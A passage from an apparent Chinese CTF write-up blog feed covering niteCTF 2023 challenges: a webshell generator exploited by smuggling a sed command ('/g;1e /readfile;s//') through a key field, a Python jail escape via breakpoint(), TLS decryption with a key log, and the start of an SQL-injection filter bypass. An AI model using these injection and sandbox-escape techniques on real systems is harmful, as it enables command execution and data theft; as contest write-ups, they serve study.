punctuation">:</span> 400px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0px 0px 10px <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0.2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">h1</span> <span class="token punctuation">&#123;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">label</span> <span class="token punctuation">&#123;</span>            <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #666<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">input[type="text"],        select</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">input[type="submit"]</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #4CAF50<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px 20px<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>            <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">input[type="submit"]:hover</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #3e8e41<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Webshell生成器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>language<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Webshell语言：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>language<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请求方法：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>POST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GET<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>REQUEST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>REQUEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>密钥：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>114<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[A-Za-z0-9]+<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>你的key太复杂了！简单点！o.O<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Webshell文件名称：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>webshell.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>生成你的专属Webshell！<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>download.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename=<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>generate.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token builtin class-name">set</span> <span class="token parameter variable">-e</span><span class="token assign-left variable">NEW_FILENAME</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">tr</span> <span class="token parameter variable">-dc</span> a-z0-9 <span class="token operator">&lt;</span>/dev/urandom <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">16</span><span class="token variable">)</span></span><span class="token function">cp</span> template.php <span class="token string">"/tmp/<span class="token variable">$NEW_FILENAME</span>"</span><span class="token builtin class-name">cd</span> /tmp<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/KEY/<span class="token variable">$KEY</span>/g"</span> <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/METHOD/<span class="token variable">$METHOD</span>/g"</span> <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span>realpath <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个文件看出<code>$KEY</code>和<code>$METHOD</code>参数可控，那么可以利用这里来得到flag。<br>这里将其提前闭合，可将<code>$KEY</code>赋值为<code>/g</code>，然后e参数可以执行命令<br><code>sed -i &quot;s/KEY//g;1e /readfile;//&quot; &quot;$NEW_FILENAME&quot;</code><br><code>s/KEY//g;</code>会把KEY置空，将上面的命令进行闭合即可<br><code>sed -i &quot;s/KEY//g;1e /readfile;s//&quot; &quot;$NEW_FILENAME&quot;</code><br>那么key只需传入<code>/g;1e /readfile;s//</code><br><img src="https://img-blog.csdnimg.cn/direct/b3bfc0ece8bd4f82957c6e4b4a362870.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/direct/2bb8f44e6b6d4d2a8b5b6c35bdc0612c.png" alt="456"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="赛事WP" scheme="http://3143047748.github.io/categories/%E8%B5%9B%E4%BA%8BWP/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>niteCTF-2023-MISC</title>
    <link href="http://3143047748.github.io/2023/12/21/niteCTF-2023-MISC/"/>
    <id>http://3143047748.github.io/2023/12/21/niteCTF-2023-MISC/</id>
    <published>2023-12-20T16:56:08.000Z</published>
    <updated>2023-12-20T16:57:58.988Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="blindjail"><a href="#blindjail" class="headerlink" title="blindjail"></a>blindjail</h2><p>nc连接题目，也没有源码<br><img src="https://img-blog.csdnimg.cn/direct/965af19a6dbf4a0eaa03b21e89043b44.png" alt="123"><br>看起来像是python终端，要进行命令执行时发现import被禁了<br>在这里了解到python中的一个函数<strong>breakpoint()</strong><br><img src="https://img-blog.csdnimg.cn/direct/c3de4eefccdd4c1f9af07b920b7b4f41.png" alt="12"><br>那么这里就使用这个函数尝试一下<br><img src="https://img-blog.csdnimg.cn/direct/ee933b91579b454590e5e63f8cd88dba.png" alt="456"><br>当然还可以使用全角字符绕过<br><img src="https://img-blog.csdnimg.cn/direct/c6cc0ea01d334648b1f6e1eeeef9801b.png" alt="132"></p><p>趁机偷一下源码😁</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># main.py</span><span class="token comment"># print(getattr("".__class__.___mro___.__subclasses__()[108])().load_module("\x6f\x73"),"")</span><span class="token comment"># subclasses = "".__class__.__mro__[1].__subclasses__()</span><span class="token comment"># print("Subclasses:", subclasses)</span><span class="token keyword">def</span> <span class="token function">checker</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># a = inp  # f'flag'+ inp</span>    <span class="token comment"># print(a)</span>    <span class="token comment"># redact the keyword lists</span>    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> <span class="token punctuation">[</span>        <span class="token string">"eval"</span><span class="token punctuation">,</span>        <span class="token string">"exec"</span><span class="token punctuation">,</span>        <span class="token string">"import"</span><span class="token punctuation">,</span>        <span class="token string">"open"</span><span class="token punctuation">,</span>        <span class="token string">"os"</span><span class="token punctuation">,</span>        <span class="token string">"read"</span><span class="token punctuation">,</span>        <span class="token string">"system"</span><span class="token punctuation">,</span>        <span class="token string">"write"</span><span class="token punctuation">,</span>        <span class="token string">"subprocess"</span><span class="token punctuation">,</span>        <span class="token string">"str"</span><span class="token punctuation">,</span>        <span class="token string">"flag"</span><span class="token punctuation">,</span>        <span class="token string">"import"</span><span class="token punctuation">,</span>        <span class="token string">"cat"</span><span class="token punctuation">,</span>        <span class="token string">"63"</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> inp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f" Nope,  </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">  is banned! "</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        o <span class="token operator">=</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> o <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>    <span class="token string">"------------------------------------------------------------- \n WELCOME TO THE BLINDJAIL \n --------------------------------------------------------\n "</span>    <span class="token string">"\x1B[3m fret not that you cannot see, fret that you cannot leave.\x1B[0m "</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> inp<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        checker<span class="token punctuation">(</span>inp<span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nBye!"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nBye!"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"look for the light! \n"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DecryptaQuest"><a href="#DecryptaQuest" class="headerlink" title="DecryptaQuest"></a>DecryptaQuest</h2><p>给了一个流量包<a href="https://github.com/daffainfo/ctf-writeup/blob/main/niteCTF%202023/DecryptaQuest/Decryta_logs.pcapng">Decryta_logs.pcapng</a><br>存在一些未解密的tls流量包，打开之后经过一番查找找到一段base64密文，使用cyber解码一下<br><img src="https://img-blog.csdnimg.cn/direct/0af975aab3d548998d6ee631e4854276.png" alt="123"><br>通过一下内容看出是SSLKEYLOGFILE</p><blockquote><p>CLIENT_HANDSHAKE_TRAFFIC_SECRET<br>CLIENT_HANDSHAKE_TRAFFIC_SECRET<br>CLIENT_TRAFFIC_SECRET_0<br>SERVER_TRAFFIC_SECRET_0<br>EXPORTER_SECRET<br><img src="https://img-blog.csdnimg.cn/direct/b24592424660498e96c923ee6ab0120e.png" alt="456"></p></blockquote><p><img src="https://img-blog.csdnimg.cn/direct/afe378d07d7f4d5692ff45e0e646402c.png" alt="456"><br>现在将SSLKEYLOGFILE导出保存然后再导入到wireshark中<br>编辑-&gt;首选项-&gt;Protocols-&gt;TLS<br><img src="https://img-blog.csdnimg.cn/direct/c20137bdfbd64513bdda2b913e922398.png" alt="123"><br>然后过滤http流量<br><img src="https://img-blog.csdnimg.cn/direct/a613499b2c0c48a99f2e92576ab0920d.png" alt="132"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="赛事WP" scheme="http://3143047748.github.io/categories/%E8%B5%9B%E4%BA%8BWP/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>niteCTF-2023-Image-Gallery-wirteup</title>
    <link href="http://3143047748.github.io/2023/12/20/niteCTF-2023-Image-Gallery-wirteup/"/>
    <id>http://3143047748.github.io/2023/12/20/niteCTF-2023-Image-Gallery-wirteup/</id>
    <published>2023-12-20T13:20:40.000Z</published>
    <updated>2023-12-20T16:56:53.230Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>SQL注入绕过，js反混淆</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>题目给了源代码如下<br><strong>main.py</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> uuidapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        loweruser <span class="token operator">=</span> username<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        lowerpass <span class="token operator">=</span> password<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        invalid_entries <span class="token operator">=</span> invalid_entries <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">"="</span><span class="token punctuation">,</span>            <span class="token string">"&lt;"</span><span class="token punctuation">,</span>            <span class="token string">">"</span><span class="token punctuation">,</span>            <span class="token string">"+"</span><span class="token punctuation">,</span>            <span class="token string">"//"</span><span class="token punctuation">,</span>            <span class="token string">"|"</span><span class="token punctuation">,</span>            <span class="token string">";"</span><span class="token punctuation">,</span>            <span class="token string">" "</span><span class="token punctuation">,</span>            <span class="token string">" "</span><span class="token punctuation">,</span>            <span class="token string">"'1"</span><span class="token punctuation">,</span>            <span class="token string">" 1"</span><span class="token punctuation">,</span>            <span class="token string">" true"</span><span class="token punctuation">,</span>            <span class="token string">"'true"</span><span class="token punctuation">,</span>            <span class="token string">" or"</span><span class="token punctuation">,</span>            <span 